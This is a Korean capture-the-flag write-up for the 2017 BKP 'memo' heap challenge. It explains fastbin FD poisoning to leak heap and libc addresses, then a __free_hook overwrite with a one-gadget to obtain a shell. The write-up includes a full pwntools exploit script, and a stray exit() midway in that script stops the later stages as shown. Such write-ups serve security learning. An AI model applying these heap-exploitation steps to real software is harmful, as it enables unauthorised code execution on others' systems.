# 2017 bkp - [PWN] memo

## Key words

- pwnable
- x86_64 | NX | FULL RELRO
- heap (fastbin)
- logic bug to leak the libc address

## Solution

문제에 5가지 메뉴가 제공됩니다.

1. 메시지 할당
  - 메시지 인덱스와 크기를 입력 받음
    - Size > 0x20: 메시지 리스트에 추가 하진 않지만 메모를 남길 수 있게 해줌. `malloc(0x20)`을 하지만 `read`시에 0x20보다 크게 넣은 값으로 읽기 때문에 힙 오버플로우 발생
    - size <= 0x20: 해당 크기로 `malloc`을 한 뒤, 0x602a70[idx]에 주소를 넣음
2. 메시지 수정
  - 수정 시 따로 인덱스를 입력 받지 않고 방금 할당한 위치의 메시지를 수정
  - 수정되는 크기는 처음에 할당했던 크기만큼 수정됨
  - g_idx : 0x602a00
3. 메시지 보기
  - 인덱스를 입력 받고, 해당 인덱스에 해당하는 메시지를 보여줌
4. 메시지 삭제
  - 인덱스를 입력 받고, 0x602a70[idx] 의 값이 존재하면 free를 한 뒤, 0으로 초기화
5. 패스워드 변경
  - 프로그램 시작 시, 유저의 이름과 패스워드를 입력 받음
  - 각각의 크기는 0x20인데 0x21만큼 입력을 할 수 있어서 패스워드 다음 1바이트 오버플로우 발생
  - 오버플로우 되는 1바이트는 idx 0 의 크기를 가리킴

문제에서 요구 되는 내용
- 힙 주소 노출
- libc 주소 노출
- 실행 흐름 조작

처음에 아이디와 패스워드를 입력 받는데 이 부분은 뒤쪽에서 다시 설명 하겠습니다.

먼저, 힙 주소를 노출하기 위해 메시지를 2개 이상 생성한 뒤, 삭제 하고 다시 할당하게 되면, 할당하거나 해제할때 메모리 초기화를 하지 않기 때문에 할당된 위치의 데이터에 `FD`의 값이 남아 있게 됩니다.

```python
fn_leave(0, 0x20, "A"*4)
fn_leave(1, 0x20, "B"*4)
fn_leave(2, 0x20, "C"*4)

fn_free(2)
fn_free(1)
fn_free(0)

fn_leave(0, 0x20, "")
```

메모리는 다음과 같습니다.
```
*** heap [0x603000] ***
00000000  00 00 00 00  00 00 00 00  31 00 00 00  00 00 00 00  │····│····│1···│····│
00000010  0a 30 60 00  00 00 00 00  00 00 00 00  00 00 00 00  │·0`·│····│····│····│
00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000030  00 00 00 00  00 00 00 00  31 00 00 00  00 00 00 00  │····│····│1···│····│
00000040  60 30 60 00  00 00 00 00  00 00 00 00  00 00 00 00  │`0`·│····│····│····│
00000050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000060  00 00 00 00  00 00 00 00  31 00 00 00  00 00 00 00  │····│····│1···│····│
00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
```

`fn_free(0)` 에서 남은 `FD`가 `heap + 0x10`에 남게 되고 메시지를 하나 더 생성하게 되면 띄어 쓰기 때문에 마지막 바이트가 `0a`로 되고 그 위의 바이트는 남게 됩니다.

페이지 (코드, 스택, 힙, 등등)는 0x1000 바이트로 정렬이 되기 때문에 힙의 베이스 주소가 `0x603000`임을 알 수 있습니다.

다음에는 libc 주소를 찾아야 합니다. libc 주소를 노출해야 하는데 `fast bin`의 `FD`는 항상 힙 영역을 가리키기 때문에 `main_arena`를 노출 할수가 없기 때문에 다른 곳에서 libc 주소를 노출해야 합니다.

이 때, 힙 오버플로우가 발생됨을 이용하여 libc 주소를 노출해도록 하겠습니다.

먼저 방금 할당한 `idx 0 : 0x603000`을 해제하면 현재 free list는 `0x603000` -> `0x603030` -> `0x603060` 이 되게 됩니다.

메시지 할당에서 힙 오버플로우를 이용하여 `0x603030`의 `FD`영역에 우리가 원하는 주소를 넣고 2번 할당하게 되면 2번째 할당되는 주소가 우리가 강제로 `FD`영역에 넣은 주소가 되게 됩니다.

약간 더 추가적으로 설명하자면
- `0x603000`에 할당 : 이 때 `0x603030`의 `FD` 영역을 "AAAAAAAA"로 덮음  
- 이 때, free list는 다음과 같음
  - `0x603030` -> `AAAAAAAA`
- 따라서, 다시 할당하게 되면 `0x603030`에 할당되고 그 다음에 할당은 `AAAAAAAA`에 할당이 되게 됩니다.

한 가지, 조건은 `AAAAAAAA` 의 주소 + 8 위치에 크기(0x31) 값이 존재해야 합니다. 만약, 적절한 크기가 존재하여 `AAAAAAAA`에 할당이 되면 `AAAAAAAA+0x10` 위치 부터 우리가 원하는 값을 쓸 수 있게 됩니다.

주소를 노출해야 하기 때문에 3번 메뉴인 메시지 보기메뉴가 어디서 참조 하는지 보고 이 곳을 수정할 수 있으면 libc주소를 노출 할 수 있을 것 같습니다.

메시지 보기는 `0x602a70[idx]`로 동작하는데 처음으로 잠시 돌아 가면 `0x602a40`위치에 패스워드를 넣을 수 있습니다. 따라서 패스워드 값에 힙 헤더를 넣고 이곳에 할당을 하면 `0x602a60` 에 위치한 메시지 크기 값들을 변경할 수 있고 이 값을 크게 변경하여 최종적으로 `0x602a70` 위치를 덮을 수 있습니다.

`0x602a70[0] : 0x602a40` 으로 두고, `0x602a70[1] : got@__libc_start_main`으로 하고 `fn_view(1)`을 이용하여 `__libc_start_main`의 주소를 구하고 `libc base` 주소 및 그 외 필요한 주소들을 구할 수 있습니다.

주소를 구한 뒤, 다시 메시지 포인터를 `__free_hook`으로 덮고 `fn_edit` 메뉴를 이용하여 `one_shot` 주소를 넣게 되면 `__free_hook`의 값이 `one_shot` 으로 변경되게 되고 존재하는 메시지 아무거나 해제를 하게 되면 쉘이 떨어지게 됩니다.

총 익스플로잇 코드는 다음과 같습니다.

```python
from pwn import *
import sys

context(arch='amd64', os='linux')

DEBUG = False
if len(sys.argv) > 1:
	DEBUG = True

def fn_leave(idx, n, msg, last=False):
	p.sendline("1")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(idx))
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(n))
	if last: return

	recv = p.recv()
	if DEBUG: print recv

	p.sendline(msg)
	recv = p.recv()
	if DEBUG: print recv
	return recv

def fn_edit(msg):
	p.sendline("2")
	recv = p.recv()
	if DEBUG: print recv

	p.send(msg)
	recv = p.recv()
	if DEBUG: print recv
	return recv

def fn_view(idx):
	p.sendline("3")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(idx))
	recv = p.recv()
	if DEBUG: print recv
	return recv

def fn_free(idx, last=False):
	p.sendline("4")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(idx))
	if last: return

	recv = p.recv()
	if DEBUG: print recv
	return recv

def fn_chg_pw(pw, name, new_pw):
	p.sendline("5")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(pw)
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(name)
	recv = p.recv()
	if DEBUG: print recv

	p.send(new_pw)
	recv = p.recv()
	if DEBUG: print recv

def fn_leak(addr, n, title=""):
	print "*** {} ***".format(title)
	print hexdump(p.leak(addr, n))
	print

target = "./memo"

p = process(target)
e = ELF(target)

dbg_heap = 0x603000
addr_name = 0x602a20
addr_pass = 0x602a40
addr_msg = 0x602a70
got_libc_main = 0x601fb0
addr_cur_idx = 0x602a00

print p.recv()
p.sendline("hackability")
print p.recv()
p.sendline("y")
print p.recv()

payload = ""
payload += "A\x0a" + "\x00"*6 + p64(0x31)
payload += p64(0) * 2
payload += "\xf0" # size of idx 0
p.sendline(payload)
print p.recv()

fn_leave(0, 0x20, "A"*4)
fn_leave(1, 0x20, "B"*4)
fn_leave(2, 0x20, "C"*4)

fn_free(2)
fn_free(1)
fn_free(0)

fn_leave(0, 0x20, "")
recv = fn_view(0).split("\x0a")[1]
base_heap = u64(("\x00" + recv).ljust(8, "\x00"))

print "[*] heap base : {}".format(hex(base_heap))

fn_free(0)

payload = ""
payload += p64(0) * 5 + p64(0x31)
payload += p64(addr_pass)
fn_leave(0, 0x80, payload)

fn_leak(base_heap, 0x80, "heap [0x603000]")
exit()

fn_leave(1, 0x20, "D"*8)
fn_leave(0, 0x20, "E"*8) # will place on password

payload = ""
payload += "A\x0a" + "\x00"*6 + p64(0x31)
payload += p64(0)*2
payload += "\xf0"
fn_chg_pw("A", "hackability", payload)

fn_leak(addr_name, 0x60, str(hex(addr_name)))

payload = ""
payload += "A\x0a" + "\x00"*6 + p64(0x31)
payload += p64(0xf0) * 2
fn_edit(payload)
fn_leak(addr_name, 0x60, str(hex(addr_name)))

payload = ""
payload += "A\x0a" + "\x00"*6 + p64(0x31)
payload += p64(0xf0) * 2
payload += p64(addr_pass)
payload += p64(got_libc_main)
fn_edit(payload)

fn_leak(addr_name, 0x60, str(hex(addr_name)))

recv = fn_view(1).split(": ")[1].split("\x0a")[0]
recv = u64(recv.ljust(8, "\x00"))
libc_base = recv - 0x20740

one_shot      = libc_base + 0x4526a
__free_hook   = libc_base + 0x3c67a8
__libc_start_main = libc_base + 0x20740

print "libc base : {}".format(hex(libc_base))

payload = ""
payload += "A\x0a" + "\x00"*6 + p64(0x31)
payload += p64(0xf0) * 2
payload += p64(addr_pass) * 2
payload += p64(__free_hook)
fn_edit(payload)
fn_leak(addr_cur_idx, 0x10, "cur idx")

fn_leak(addr_name, 0x60, str(hex(addr_name)))
fn_leak(__free_hook, 0x10, "__free_hook : "+hex(__free_hook))

fn_edit(p64(one_shot))
fn_leak(__free_hook, 0x10, "__free_hook : "+hex(__free_hook))

fn_free(0, True)
p.interactive()
```
